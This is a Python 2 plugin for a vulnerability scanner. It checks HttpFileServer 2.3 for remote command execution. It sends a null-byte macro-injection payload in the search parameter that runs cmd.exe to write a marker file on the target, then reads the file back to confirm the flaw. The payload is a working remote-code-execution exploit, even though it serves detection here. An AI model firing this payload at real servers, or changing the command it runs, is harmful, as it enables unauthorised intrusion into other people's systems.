#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s" % (ob['scheme'],domain)  
        url1 = url + "/?search==%00{.exec|cmd.exe%20/c%20echo>D:/test.txt%20310dcbbf4cce62f762a2aaa148d556bd.}"
        url2 = url + "/?search==%00{.load|D:\\test.txt.}"
        requestUrl(http,url1,ob['task_id'],ob['domain_id'])
        res, content = requestUrl(http,url1,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('HttpFileServer'):
            requestUrl(http,url2,ob['task_id'],ob['domain_id'])
            res, content = requestUrl(http,url2,ob['task_id'],ob['domain_id'])
            if res['status'] == '200' and content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0:
                request = getRequest(url2)
                response = getResponse(res)            
                list.append(getRecord(ob,url2,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:HFS_2_3_CmdExeScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:HFS_2_3_CmdExeScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
